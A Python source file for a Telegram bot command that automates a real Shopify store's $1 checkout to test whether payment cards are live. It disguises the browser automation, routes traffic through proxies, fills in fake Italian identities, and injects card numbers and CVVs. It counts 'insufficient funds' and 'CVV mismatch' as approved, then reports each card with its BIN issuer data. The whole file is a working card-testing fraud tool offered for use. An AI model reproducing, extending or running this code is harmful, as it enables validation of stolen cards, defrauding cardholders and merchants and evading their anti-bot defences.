from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import random
import time
import logging
from telegram import Update
from telegram.ext import ContextTypes

from card_parser import parse_card_input
from security import is_allowed_chat, get_chat_permissions, can_use_command
from api_client import api_client

logger = logging.getLogger(__name__)

class Shopify1CheckoutAutomation:
    def __init__(self, headless=True, proxy_url=None):
        self.driver = None
        self.wait = None
        self.headless = headless
        self.proxy_url = proxy_url
    
    def setup_driver(self):
        """Inizializza il driver selenium con proxy - OTTIMIZZATO"""
        try:
            chrome_options = Options()
            
            if self.headless:
                chrome_options.add_argument("--headless")
            
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # OTTIMIZZAZIONI PER VELOCITÀ
            chrome_options.add_argument("--disable-images")
            chrome_options.add_argument("--disable-javascript")
            chrome_options.add_argument("--disable-plugins")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument("--disable-background-timer-throttling")
            chrome_options.add_argument("--disable-renderer-backgrounding")
            chrome_options.add_argument("--disable-backgrounding-occluded-windows")
            
            # USER AGENT
            chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            
            # CONFIGURA PROXY se fornito
            if self.proxy_url:
                logger.info(f"🔌 Usando proxy: {self.proxy_url}")
                chrome_options.add_argument(f'--proxy-server={self.proxy_url}')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            # Timeout ridotto per maggiore velocità
            self.wait = WebDriverWait(self.driver, 10)
            logger.info("✅ Driver Shopify $1 inizializzato (OTTIMIZZATO)")
            return True
        except Exception as e:
            logger.error(f"❌ Errore inizializzazione driver: {e}")
            return False

    def close_that_fucking_popup(self):
        """Chiude il popup - OTTIMIZZATO"""
        try:
            print("🔫 Chiudo popup...")
            
            # PRIMA PROVA CON JAVASCRIPT (PIÙ VELOCE)
            try:
                self.driver.execute_script("""
                    // Rimuovi immediatamente il popup
                    var popup = document.querySelector('#shopify-pc__banner');
                    if (popup) popup.remove();
                    
                    var dialog = document.querySelector('.shopify-pc__banner__dialog');
                    if (dialog) dialog.remove();
                    
                    // Rimuovi overlay
                    var overlays = document.querySelectorAll('.popup-overlay, .modal-overlay');
                    overlays.forEach(function(el) { el.remove(); });
                """)
                print("✅ Popup rimosso con JavaScript")
                return True
            except:
                pass
            
            # SOLO SE JAVASCRIPT FALLISCE, PROVA I SELECTOR CSS
            popup_selectors = ["#shopify-pc__banner", ".shopify-pc__banner__dialog"]
            
            for selector in popup_selectors:
                try:
                    element = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if element.is_displayed():
                        close_selectors = [f"{selector} [aria-label*='close']", f"{selector} .close", f"{selector} button"]
                        for close_selector in close_selectors:
                            try:
                                close_btn = self.driver.find_element(By.CSS_SELECTOR, close_selector)
                                self.driver.execute_script("arguments[0].click();", close_btn)
                                print(f"✅ Chiuso popup con: {close_selector}")
                                return True
                            except:
                                continue
                except:
                    continue
                
        except Exception as e:
            print(f"ℹ️ Nessun popup trovato: {e}")
        return False

    def generate_italian_info(self):
        """Genera informazioni italiane per il checkout"""
        first_names = ['Marco', 'Luca', 'Giuseppe', 'Andrea']
        last_names = ['Rossi', 'Bianchi', 'Verdi', 'Russo']
        streets = ['Via Roma', 'Corso Italia', 'Piazza della Signoria']
        
        return {
            'first_name': random.choice(first_names),
            'last_name': random.choice(last_names),
            'email': f"test{random.randint(1000,9999)}@test.com",
            'phone': f"3{random.randint(10,99)}{random.randint(1000000,9999999)}",
            'address': f"{random.choice(streets)} {random.randint(1, 150)}",
            'city': 'Firenze',
            'postal_code': f"50{random.randint(100, 999)}",
            'name_on_card': 'TEST CARD'
        }
    
    def add_to_cart(self):
        """Aggiunge il prodotto al carrello - OTTIMIZZATO"""
        print("🛒 Aggiunta prodotto...")
        
        try:
            self.driver.get("https://earthesim.com/products/usa-esim?variant=42902995271773")
            time.sleep(3)
            
            # Chiudi popup
            self.close_that_fucking_popup()
            time.sleep(1)
            
            add_button = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']")))
            
            # Click immediato con JavaScript
            self.driver.execute_script("arguments[0].click();", add_button)
            print("✅ Prodotto aggiunto")
            
            # Verifica rapida
            time.sleep(2)
            
            return True
            
        except Exception as e:
            print(f"❌ Errore aggiunta carrello: {e}")
            return False
    
    def go_to_cart_and_checkout(self):
        """Va al carrello e clicca checkout - OTTIMIZZATO"""
        try:
            print("🛒 Andando al carrello...")
            
            self.driver.get("https://earthesim.com/cart")
            time.sleep(3)
            
            # Cerca bottone checkout PRIMA di chiudere popup
            checkout_selectors = ["button#checkout", "button[name='checkout']", "a[href*='checkout']"]
            
            checkout_button = None
            for selector in checkout_selectors:
                try:
                    checkout_button = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, selector)))
                    print(f"✅ Trovato checkout: {selector}")
                    break
                except:
                    continue
            
            if not checkout_button:
                print("❌ Checkout non trovato")
                return False
            
            # Chiudi popup solo se necessario
            self.close_that_fucking_popup()
            time.sleep(1)
            
            # Click JavaScript
            self.driver.execute_script("arguments[0].click();", checkout_button)
            print("✅ Checkout cliccato")
            
            time.sleep(5)
            return True
                
        except Exception as e:
            print(f"❌ Errore checkout: {e}")
            return False
    
    def fill_shipping_info(self, info):
        """Compila informazioni spedizione - OTTIMIZZATO"""
        print("📦 Compilazione spedizione...")
        
        try:
            time.sleep(5)
            
            # Compilazione VELOCE senza pause lunghe
            fields = [
                ("input#email", info['email']),
                ("input#TextField0", info['first_name']),
                ("input#TextField1", info['last_name']),
                ("input#billing-address1", info['address']),
                ("input#TextField4", info['city']),
                ("input#TextField3", info['postal_code']),
                ("input#TextField5", info['phone'])
            ]
            
            for selector, value in fields:
                try:
                    field = self.driver.find_element(By.CSS_SELECTOR, selector)
                    field.clear()
                    # Inserimento più veloce
                    self.driver.execute_script(f"arguments[0].value = '{value}';", field)
                    self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", field)
                except:
                    continue
            
            print("✅ Spedizione compilata")
            return True
            
        except Exception as e:
            print(f"❌ Errore spedizione: {e}")
            return False
    
    def fill_payment_info(self, info, card_data):
        """Compila informazioni pagamento - OTTIMIZZATO"""
        print("💳 Compilazione pagamento...")
        
        try:
            time.sleep(2)
            
            # CARD NUMBER
            card_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-number']")
            self.driver.switch_to.frame(card_iframe)
            card_field = self.driver.find_element(By.CSS_SELECTOR, "input#number")
            self.driver.execute_script(f"arguments[0].value = '{card_data['number']}';", card_field)
            self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", card_field)
            self.driver.switch_to.default_content()
            time.sleep(0.5)
            
            # EXPIRY DATE
            expiry_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-expiry']")
            self.driver.switch_to.frame(expiry_iframe)
            expiry_field = self.driver.find_element(By.CSS_SELECTOR, "input#expiry")
            expiry_value = f"{card_data['month']}/{card_data['year']}"
            self.driver.execute_script(f"arguments[0].value = '{expiry_value}';", expiry_field)
            self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", expiry_field)
            self.driver.switch_to.default_content()
            time.sleep(0.5)
            
            # CVV
            cvv_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-verification_value']")
            self.driver.switch_to.frame(cvv_iframe)
            cvv_field = self.driver.find_element(By.CSS_SELECTOR, "input#verification_value")
            self.driver.execute_script(f"arguments[0].value = '{card_data['cvv']}';", cvv_field)
            self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", cvv_field)
            self.driver.switch_to.default_content()
            time.sleep(0.5)
            
            # NAME ON CARD
            name_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-name']")
            self.driver.switch_to.frame(name_iframe)
            name_field = self.driver.find_element(By.CSS_SELECTOR, "input#name")
            self.driver.execute_script(f"arguments[0].value = '{info['name_on_card']}';", name_field)
            self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", name_field)
            self.driver.switch_to.default_content()
            time.sleep(1)
            
            # Validazione veloce
            self.driver.execute_script("document.activeElement.blur();")
            time.sleep(1)
            
            print("✅ Pagamento compilato")
            return True
            
        except Exception as e:
            print(f"❌ Errore pagamento: {e}")
            try:
                self.driver.switch_to.default_content()
            except:
                pass
            return False
    
    def complete_purchase(self):
        """Completa acquisto - OTTIMIZZATO"""
        print("🚀 Completamento acquisto...")
        
        try:
            time.sleep(2)
            
            pay_button = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "button#checkout-pay-button")))
            
            # Verifica rapida e click
            is_enabled = pay_button.is_enabled()
            print(f"🔍 Pay Now abilitato: {is_enabled}")
            
            if is_enabled:
                self.driver.execute_script("arguments[0].click();", pay_button)
                print("✅ Pay Now cliccato")
                time.sleep(5)
                return True
            else:
                # Prova comunque
                self.driver.execute_script("arguments[0].click();", pay_button)
                print("✅ Pay Now forzato")
                time.sleep(5)
                return True
                
        except Exception as e:
            print(f"❌ Errore completamento: {e}")
            return False
    
    def analyze_result(self):
        """Analizza risultato - MIGLIORATO CON PIÙ ERRORI"""
        print("🔍 Analisi risultato...")
        
        try:
            time.sleep(5)
            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            current_url = self.driver.current_url
            
            print(f"📄 URL finale: {current_url}")
            
            # ✅ SUCCESSO - TUTTI I POSSIBILI INDICATORI DI APPROVAZIONE
            success_indicators = [
                "thank you", "order confirmed", "payment successful", "success", 
                "completed", "approved", "grazie", "ordine confermato",
                "your order is confirmed", "transaction successful", "purchase complete",
                "order number", "confirmation", "receipt", "congratulations",
                "insufficient funds", "cvv mismatch"  # QUESTI SONO APPROVED!
            ]
            
            for indicator in success_indicators:
                if indicator in page_text:
                    print(f"✅ APPROVED - Trovato: {indicator}")
                    return "APPROVED"
            
            # ❌ ERRORI DI CARTA - SOLO DECLINI VERI
            decline_indicators = [
                "your card was declined", "card declined", "declined", 
                "do not honor", "invalid card", "expired card",
                "transaction not allowed", "processor declined", 
                "gateway rejected", "fraud detected", "payment failed", 
                "transaction failed", "could not process", "cannot be processed", 
                "not authorized", "invalid account", "incorrect card", 
                "card number invalid", "try another card"
            ]
            
            for indicator in decline_indicators:
                if indicator in page_text:
                    print(f"❌ DECLINED - Trovato: {indicator}")
                    return f"DECLINED - {indicator.title()}"
            
            # 🛡️ 3D SECURE - AUTENTICAZIONE RICHIESA
            secure_indicators = [
                "3d", "secure", "authentication", "verification required",
                "additional verification", "bank authentication", "3-d secure",
                "redirecting to bank", "secure code", "one time password"
            ]
            
            for indicator in secure_indicators:
                if indicator in page_text:
                    print(f"🛡️ 3DS REQUIRED - Trovato: {indicator}")
                    return "3DS_REQUIRED"
            
            # ⚠️ ERRORI DI SISTEMA - PROBLEMI TECNICI
            system_errors = [
                "timeout", "server error", "gateway error", "temporarily unavailable",
                "maintenance", "try again later", "service unavailable", "connection error",
                "network error", "page not found", "404", "500", "502", "503"
            ]
            
            for indicator in system_errors:
                if indicator in page_text:
                    print(f"⚠️ SYSTEM ERROR - Trovato: {indicator}")
                    return f"SYSTEM_ERROR - {indicator.title()}"
            
            # 🔍 ERRORI DI VALIDAZIONE - PROBLEMI NEI DATI
            validation_errors = [
                "invalid email", "invalid phone", "invalid address", "required field",
                "missing information", "please complete", "field required", "enter valid",
                "incorrect format", "postal code invalid", "city required", "name required"
            ]
            
            for indicator in validation_errors:
                if indicator in page_text:
                    print(f"⚠️ VALIDATION ERROR - Trovato: {indicator}")
                    return f"VALIDATION_ERROR - {indicator.title()}"
            
            # 🔄 ANCORA IN CHECKOUT - PAGAMENTO NON COMPLETATO
            if "checkout" in current_url or "cart" in current_url:
                print("🔄 STILL IN CHECKOUT - Pagamento non completato")
                return "STILL_IN_CHECKOUT"
            
            # Se non trova nulla ma siamo su una pagina diversa, potrebbe essere successo
            if "earthesim.com" not in current_url and "thank" not in page_text:
                print("🔄 REDIRECTED - Possibile successo")
                return "APPROVED"
            
            # Se siamo ancora qui, stato sconosciuto
            print("🔍 UNKNOWN - Nessun indicatore trovato")
            return "UNKNOWN - Check manually"
            
        except Exception as e:
            print(f"💥 ERRORE analisi: {str(e)}")
            return f"ANALYSIS_ERROR - {str(e)}"
    
    def process_payment(self, card_data):
        """Processa pagamento - OTTIMIZZATO"""
        try:
            print(f"🚀 Inizio processo Shopify $1 (OTTIMIZZATO)")
            
            if not self.setup_driver():
                return "ERROR_DRIVER_INIT"
            
            test_info = self.generate_italian_info()
            
            if not self.add_to_cart():
                return "ERROR_ADD_TO_CART"
            
            if not self.go_to_cart_and_checkout():
                return "ERROR_CHECKOUT"
            
            if not self.fill_shipping_info(test_info):
                return "ERROR_SHIPPING_INFO"
            
            if not self.fill_payment_info(test_info, card_data):
                return "ERROR_PAYMENT_INFO"
            
            if not self.complete_purchase():
                return "ERROR_COMPLETE_PURCHASE"
            
            result = self.analyze_result()
            return result
            
        except Exception as e:
            print(f"💥 Errore: {e}")
            return f"ERROR - {str(e)}"
        finally:
            if self.driver:
                self.driver.quit()

def process_shopify1_payment(card_number, expiry, cvv, headless=True, proxy_url=None):
    """
    Processa una carta su Shopify $1 - OTTIMIZZATO
    """
    processor = Shopify1CheckoutAutomation(headless=headless, proxy_url=proxy_url)
    card_data = {
        'number': card_number,
        'month': expiry[:2],
        'year': "20" + expiry[2:],
        'cvv': cvv
    }
    return processor.process_payment(card_data)

async def s1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card with Shopify $1 - OTTIMIZZATO"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    
    if not is_allowed_chat(chat_id, chat_type, user_id):
        permission_info = get_chat_permissions(chat_id, chat_type, user_id)
        await update.message.reply_text(f"❌ {permission_info}")
        return
    
    can_use, error_msg = can_use_command(user_id, 's1')
    if not can_use:
        await update.message.reply_text(error_msg)
        return
    
    if not context.args:
        await update.message.reply_text(
            "🛍️ **Shopify $1 Check (OTTIMIZZATO)**\n\n"
            "Usage: /s1 number|month|year|cvv [proxy]\n\n"
            "Example: /s1 4111111111111111|12|2028|123\n"
            "With proxy: /s1 4111111111111111|12|2028|123 http://proxy-ip:port"
        )
        return
    
    # COMBINE ALL ARGUMENTS
    full_input = ' '.join(context.args)
    logger.info(f"🔍 Shopify $1 input: {full_input}")
    
    # FIND PROXY
    import re
    proxy_match = re.search(r'(https?://[^\s]+)', full_input)
    proxy_url = proxy_match.group(0) if proxy_match else None
    
    # REMOVE PROXY FROM INPUT
    if proxy_url:
        card_input = full_input.replace(proxy_url, '').strip()
        logger.info(f"🔌 Shopify $1 proxy: {proxy_url}")
    else:
        card_input = full_input
    
    # CLEAN SPACES
    card_input = re.sub(r'\s+', ' ', card_input).strip()
    
    wait_message = await update.message.reply_text("🔄 Checking Shopify $1 (FAST)...")
    
    try:
        parsed_card = parse_card_input(card_input)
        
        if not parsed_card['valid']:
            await wait_message.edit_text(f"❌ Invalid card format: {parsed_card['error']}")
            return
        
        logger.info(f"🎯 Shopify $1 card: {parsed_card['number'][:6]}******{parsed_card['number'][-4:]}")
        
        # GET BIN INFORMATION
        bin_number = parsed_card['number'][:6]
        bin_result = api_client.bin_lookup(bin_number)
        
        # EXECUTE SHOPIFY $1 CHECK
        result = process_shopify1_payment(
            parsed_card['number'],
            parsed_card['month'] + parsed_card['year'][-2:],
            parsed_card['cvv'],
            proxy_url=proxy_url
        )
        
        # FORMAT RESPONSE
        if "APPROVED" in result:
            status_emoji = "✅"
            title = "Approved"
        elif "DECLINED" in result:
            status_emoji = "❌" 
            title = "Declined"
        elif "3DS_REQUIRED" in result:
            status_emoji = "🛡️"
            title = "3DS Required"
        elif "ERROR" in result:
            status_emoji = "⚠️"
            title = "Error"
        else:
            status_emoji = "🔍"
            title = "Unknown"
        
        response = f"""{title} {status_emoji}

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: SHOPIFY $1
Response: {result}"""

        # ADD BIN INFO IF AVAILABLE
        if bin_result and bin_result['success']:
            bin_data = bin_result['data']
            response += f"""

BIN Info:
Country: {bin_data.get('country', 'N/A')}
Issuer: {bin_data.get('issuer', 'N/A')}
Scheme: {bin_data.get('scheme', 'N/A')}
Type: {bin_data.get('type', 'N/A')}
Tier: {bin_data.get('tier', 'N/A')}"""
        
        await wait_message.edit_text(response)
        
    except Exception as e:
        logger.error(f"❌ Error in s1_command: {e}")
        await wait_message.edit_text(f"❌ Error: {str(e)}")